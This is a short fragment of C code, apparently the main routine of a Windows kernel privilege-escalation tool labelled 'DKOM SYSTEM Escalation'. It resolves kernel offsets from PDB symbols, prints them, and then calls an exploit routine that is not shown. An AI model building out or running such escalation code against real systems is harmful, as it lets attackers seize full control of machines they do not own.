    bool offsets_only = (argc >= 2 && _stricmp(argv[1], "offsets") == 0);

    printf("=== ASTRA64 Kernel Offset Resolver");
    if (!offsets_only) printf(" + DKOM SYSTEM Escalation");
    printf(" ===\n\n");

    KernelOffsets off = ResolvePdbOffsets();
    if (!off.valid) {
        printf("\n[-] Offset resolution failed.\n");
        return 1;
    }

    PrintOffsets(off);

    if (offsets_only) {
        printf("\n[+] Done (offsets only — no exploit).\n");
        return 0;
    }

    return run_exploit(off);
}
